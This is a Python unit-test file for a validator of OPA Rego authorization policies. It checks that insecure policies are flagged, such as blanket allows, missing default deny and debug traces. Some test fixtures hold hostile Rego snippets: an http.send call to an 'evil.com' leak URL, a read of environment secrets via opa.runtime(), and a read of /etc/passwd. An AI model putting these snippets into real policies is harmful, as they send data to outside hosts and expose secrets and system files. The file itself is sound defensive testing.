"""Unit tests for policy validator."""

from pathlib import Path

import pytest

from sark.policy.validator import (
    FORBIDDEN_PATTERNS,
    PolicyValidator,
    Severity,
    ValidationIssue,
    ValidationResult,
)


class TestPolicyValidator:
    """Test PolicyValidator class."""

    @pytest.fixture
    def validator(self):
        """Create a PolicyValidator instance."""
        return PolicyValidator(strict=True)

    @pytest.fixture
    def lenient_validator(self):
        """Create a lenient PolicyValidator instance."""
        return PolicyValidator(strict=False)

    def test_validator_initialization(self):
        """Test validator can be initialized."""
        validator = PolicyValidator()
        assert validator.opa_path == "opa"
        assert validator.strict is True

        validator2 = PolicyValidator(opa_path="/usr/bin/opa", strict=False)
        assert validator2.opa_path == "/usr/bin/opa"
        assert validator2.strict is False

    def test_valid_policy(self, validator):
        """Test validation of a valid policy."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    input.user.role == "admin"
}

deny contains "insufficient permissions" if {
    not allow
}

reason := "Admin access" if {
    allow
}

reason := "Access denied" if {
    not allow
}
"""
        result = validator.validate(policy, policy_name="test_valid.rego")

        assert isinstance(result, ValidationResult)
        assert result.valid is True
        assert result.package_name == "test.policy"
        assert result.policy_name == "test_valid.rego"
        assert len(result.issues) == 0

    def test_missing_package(self, validator):
        """Test that missing package declaration is detected."""
        policy = """
default allow := false

allow if {
    input.user.role == "admin"
}
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(issue.code == "MISSING_PACKAGE" for issue in result.issues)

    def test_syntax_error_detection(self, validator):
        """Test that syntax errors are detected."""
        policy = """
package test.policy

default allow := false

# Missing closing brace
allow if {
    input.user.role == "admin"
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(issue.code == "SYNTAX_ERROR" for issue in result.issues)

    def test_missing_allow_deny(self, validator):
        """Test that missing allow/deny rules are detected."""
        policy = """
package test.policy

import future.keywords.if

# No allow or deny rules
reason := "some reason" if {
    true
}
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(issue.code == "MISSING_ALLOW_DENY" for issue in result.issues)

    def test_missing_reason(self, validator):
        """Test that missing reason rule is detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    input.user.role == "admin"
}

# No reason rule
"""
        result = validator.validate(policy)

        # Missing reason is HIGH severity, should fail in strict mode
        assert result.valid is False
        assert any(issue.code == "MISSING_REASON" for issue in result.issues)

    def test_missing_default_deny(self, validator):
        """Test that missing default deny is detected."""
        policy = """
package test.policy

import future.keywords.if

# No default allow := false

allow if {
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        # Missing default deny is HIGH severity
        assert result.valid is False
        assert any(issue.code == "MISSING_DEFAULT_DENY" for issue in result.issues)

    def test_blanket_allow_detection(self, validator):
        """Test that blanket allow is detected."""
        policy = """
package test.policy

default allow := true

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "BLANKET_ALLOW" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_forbidden_http_send(self, validator):
        """Test that http.send() is forbidden."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    response := http.send({
        "method": "GET",
        "url": "https://evil.com/leak"
    })
    response.status_code == 200
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "FORBIDDEN_HTTP_SEND" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_forbidden_opa_runtime(self, validator):
        """Test that opa.runtime() is forbidden."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    runtime := opa.runtime()
    runtime.env.SECRET_KEY == "leaked"
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "FORBIDDEN_OPA_RUNTIME" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_forbidden_file_access(self, validator):
        """Test that file system access is forbidden."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    data := file.read("/etc/passwd")
    contains(data, "root")
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "FORBIDDEN_FILE_ACCESS" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_unconditional_allow(self, validator):
        """Test that unconditional allow is detected."""
        policy = """
package test.policy

default allow := false

allow := true

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "UNCONDITIONAL_ALLOW" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_empty_allow_condition(self, validator):
        """Test that empty allow conditions are detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "EMPTY_ALLOW_CONDITION" and issue.severity == Severity.CRITICAL
            for issue in result.issues
        )

    def test_debug_trace_detection(self, validator):
        """Test that trace() function is detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    trace("Debug: checking user role")
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        # trace() is MEDIUM severity, should pass in lenient mode
        assert result.valid is False  # strict mode
        assert any(
            issue.code == "DEBUG_TRACE" and issue.severity == Severity.MEDIUM
            for issue in result.issues
        )

    def test_debug_print_detection(self, validator):
        """Test that print() function is detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    print("Checking permissions...")
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert any(
            issue.code == "DEBUG_PRINT" and issue.severity == Severity.MEDIUM
            for issue in result.issues
        )

    def test_overly_broad_regex(self, validator):
        """Test that overly broad regex is detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    regex.match(".*", input.user.name)
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False
        assert any(
            issue.code == "OVERLY_BROAD_REGEX" and issue.severity == Severity.HIGH
            for issue in result.issues
        )

    def test_todo_comment_detection(self, validator):
        """Test that TODO comments are detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

# TODO: implement proper authorization
allow if {
    true
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        # TODO is INFO severity, should not fail validation
        assert any(
            issue.code == "TODO_COMMENT" and issue.severity == Severity.INFO
            for issue in result.issues
        )

    def test_strict_vs_lenient_mode(self, validator, lenient_validator):
        """Test strict vs lenient validation modes."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    trace("debug message")
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        strict_result = validator.validate(policy)
        lenient_result = lenient_validator.validate(policy)

        # Strict mode should fail on MEDIUM severity
        assert strict_result.valid is False

        # Lenient mode should pass (no CRITICAL issues)
        assert lenient_result.valid is True

    def test_sample_input_testing(self, validator):
        """Test sample input testing functionality."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    input.user.role == "admin"
}

deny contains "not admin" if {
    not input.user.role == "admin"
}

reason := "Admin access" if { allow }
reason := "Access denied" if { not allow }
"""
        sample_inputs = [
            {"user": {"role": "admin"}},
            {"user": {"role": "user"}},
        ]

        result = validator.validate(
            policy,
            policy_name="test_sample.rego",
            sample_inputs=sample_inputs,
        )

        # Should validate successfully with sample inputs
        assert result.valid is True

    def test_sample_input_failure(self, validator):
        """Test that invalid sample inputs are detected."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    input.user.role == "admin"
    input.required_field.value > 100
}

reason := "test" if { true }
"""
        # Sample input missing required_field
        sample_inputs = [
            {"user": {"role": "admin"}},
        ]

        result = validator.validate(
            policy,
            policy_name="test_sample_fail.rego",
            sample_inputs=sample_inputs,
        )

        # May have sample test errors but policy syntax is valid
        # So overall validation could still pass
        assert isinstance(result, ValidationResult)

    def test_validate_file(self, validator, tmp_path):
        """Test validating a policy file."""
        policy_content = """
package test.policy

import future.keywords.if

default allow := false

allow if {
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        policy_file = tmp_path / "test_policy.rego"
        policy_file.write_text(policy_content)

        result = validator.validate_file(policy_file)

        assert result.valid is True
        assert result.policy_name == "test_policy.rego"

    def test_validate_file_not_found(self, validator):
        """Test validating a non-existent file."""
        result = validator.validate_file(Path("/nonexistent/policy.rego"))

        assert result.valid is False
        assert any(issue.code == "FILE_READ_ERROR" for issue in result.issues)

    def test_all_forbidden_patterns_have_required_fields(self):
        """Test that all forbidden patterns have required fields."""
        required_fields = {"pattern", "code", "severity", "message"}

        for pattern_def in FORBIDDEN_PATTERNS:
            assert all(
                field in pattern_def for field in required_fields
            ), f"Pattern {pattern_def.get('code')} missing required fields"

    def test_validation_result_properties(self):
        """Test ValidationResult properties."""
        result = ValidationResult(valid=True, policy_name="test.rego")

        # Add some issues
        result.issues = [
            ValidationIssue(
                severity=Severity.CRITICAL,
                code="TEST1",
                message="Critical issue",
            ),
            ValidationIssue(
                severity=Severity.HIGH,
                code="TEST2",
                message="High issue",
            ),
            ValidationIssue(
                severity=Severity.MEDIUM,
                code="TEST3",
                message="Medium issue",
            ),
        ]

        assert len(result.critical_issues) == 1
        assert len(result.high_issues) == 1
        assert result.critical_issues[0].code == "TEST1"
        assert result.high_issues[0].code == "TEST2"

    def test_validation_result_to_dict(self):
        """Test ValidationResult.to_dict() serialization."""
        result = ValidationResult(
            valid=False,
            policy_name="test.rego",
            package_name="test.policy",
        )
        result.issues.append(
            ValidationIssue(
                severity=Severity.CRITICAL,
                code="TEST",
                message="Test issue",
                line_number=10,
                context="allow := true",
                suggestion="Use allow if { ... }",
            )
        )

        result_dict = result.to_dict()

        assert result_dict["valid"] is False
        assert result_dict["policy_name"] == "test.rego"
        assert result_dict["package_name"] == "test.policy"
        assert len(result_dict["issues"]) == 1

        issue_dict = result_dict["issues"][0]
        assert issue_dict["severity"] == "critical"
        assert issue_dict["code"] == "TEST"
        assert issue_dict["message"] == "Test issue"
        assert issue_dict["line_number"] == 10
        assert issue_dict["context"] == "allow := true"
        assert issue_dict["suggestion"] == "Use allow if { ... }"

    def test_multiple_forbidden_patterns(self, validator):
        """Test policy with multiple forbidden patterns."""
        policy = """
package test.policy

import future.keywords.if

default allow := true

allow if {
    trace("debug")
    response := http.send({"url": "https://evil.com"})
    response.status_code == 200
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        assert result.valid is False

        # Should detect multiple issues
        codes = {issue.code for issue in result.issues}
        assert "BLANKET_ALLOW" in codes
        assert "DEBUG_TRACE" in codes
        assert "FORBIDDEN_HTTP_SEND" in codes

    def test_comments_ignored_in_pattern_detection(self, validator):
        """Test that comments are ignored when detecting forbidden patterns."""
        policy = """
package test.policy

import future.keywords.if

default allow := false

# This is a comment about http.send() - should not trigger
# default allow := true - also should not trigger

allow if {
    input.user.role == "admin"
}

reason := "test" if { true }
"""
        result = validator.validate(policy)

        # Should be valid - forbidden patterns in comments should be ignored
        assert result.valid is True
